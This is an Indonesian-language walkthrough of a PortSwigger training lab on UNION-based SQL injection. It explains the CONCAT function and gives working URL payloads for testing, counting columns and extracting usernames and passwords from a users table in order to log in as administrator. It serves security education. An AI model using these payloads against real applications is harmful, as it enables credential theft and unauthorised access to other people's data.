### Serangan SQL Injection UNION, Mengambil Beberapa Nilai dalam Satu Kolom

Lab ini mengilustrasikan adanya kerentanan SQL injection pada filter kategori produk. Hasil dari query ditampilkan dalam respons aplikasi, sehingga kita dapat menggunakan serangan SQL injection UNION untuk mengambil data dari tabel lain.

Database mengandung tabel lain yang disebut `users`, dengan kolom `username` dan `password`.

Untuk menyelesaikan lab ini, lakukan serangan SQL injection UNION yang mengambil semua `username` dan `password`, kemudian gunakan informasi tersebut untuk login sebagai pengguna administrator.

Petunjuk: Anda bisa menemukan payload yang berguna pada cheat sheet SQL injection kami.

---

### **Apa Itu CONCAT dan Bagaimana Cara Menggunakannya dalam SQL Injection?**

**CONCAT** adalah fungsi SQL yang digunakan untuk menggabungkan (mengconcatenate) dua atau lebih nilai menjadi satu string. Fungsi ini sangat berguna dalam serangan SQL injection untuk menggabungkan beberapa potongan data menjadi satu hasil ketika aplikasi hanya menampilkan satu kolom.

#### **Penggunaan Dasar CONCAT**:
```sql
SELECT CONCAT('foo', 'bar'); 
-- Hasil: 'foobar'
```

#### **Mengapa Menggunakan CONCAT dalam SQL Injection?**
Dalam serangan UNION, ketika aplikasi hanya mengembalikan satu kolom, **CONCAT** dapat digunakan untuk menggabungkan beberapa nilai (misalnya, `username` dan `password`) menjadi satu string. Hal ini memungkinkan penyerang untuk mengekstrak beberapa informasi dalam satu query.

---

### **Langkah-langkah untuk Melakukan Serangan**

#### **Langkah 1: Menganalisis Struktur Query**
Dengan menyuntikkan payload berikut:
```
/filter?category=Gifts'--
```
Aplikasi kemungkinan mengeksekusi query seperti ini:
```sql
SELECT product_name, description 
FROM products 
WHERE category = 'Gifts';
```
Query ini:
- Mengembalikan dua kolom: `product_name` dan `description`.

#### **Langkah 2: Menentukan Jumlah Kolom**
Untuk mengetahui jumlah kolom pada query asli, injeksikan:
```
/filter?category=Gifts'+union+all+select+NULL,NULL--
```
Jika tidak ada kesalahan, query ini mengembalikan dua kolom.

#### **Langkah 3: Menggunakan CONCAT untuk Mengambil Data**
Setelah mengetahui bahwa query mengembalikan dua kolom, gunakan kolom kedua untuk menampilkan string yang digabungkan. Sebagai contoh:
```
/filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
```

#### **Langkah 4: Mengambil Data Pengguna**
Untuk mengekstrak `username` dan `password`, gunakan:
```
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```

#### **Penjelasan Query**:
1. Query asli:
   ```sql
   SELECT product_name, description 
   FROM products 
   WHERE category = 'Gifts';
   ```
2. Query yang disuntikkan:
   ```sql
   SELECT product_name, description 
   FROM products 
   WHERE category = 'Gifts'
   UNION ALL
   SELECT NULL, CONCAT(username, ':', password) 
   FROM users;
   ```
3. Detail penting:
   - `NULL`: Placeholder untuk kolom pertama, yang tidak relevan di sini.
   - `CONCAT(username, ':', password)`: Menggabungkan `username` dan `password` dengan pemisah titik dua (`:`).

---

### **Payload yang Valid**

#### **Payload Uji Awal**:
- Menampilkan 4 item dalam kategori "Gifts":
  ```
  /filter?category=Gifts'--
  ```
- Menampilkan semua item dengan bypass:
  ```
  /filter?category=Gifts'+or+1=1--
  ```

#### **Menentukan Jumlah Kolom**:
- Gunakan:
  ```
  /filter?category=Gifts'+union+all+select+NULL,NULL--
  ```

#### **Mengambil Data yang Digabungkan**:
- Menggabungkan string statis:
  ```
  /filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
  ```
- Mengekstrak kredensial pengguna:
  ```
  /filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
  ```

---

### **Referensi**

- [SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

--- 

### **Ilustrasi**

#### **Tampilan Awal (Nama Produk)**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/1.png)

#### **Memvalidasi Jumlah Kolom**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/2.png)

#### **Menggunakan CONCAT dengan String Statis**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/3.png)

#### **Mengekstrak Data Pengguna**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/4.png)
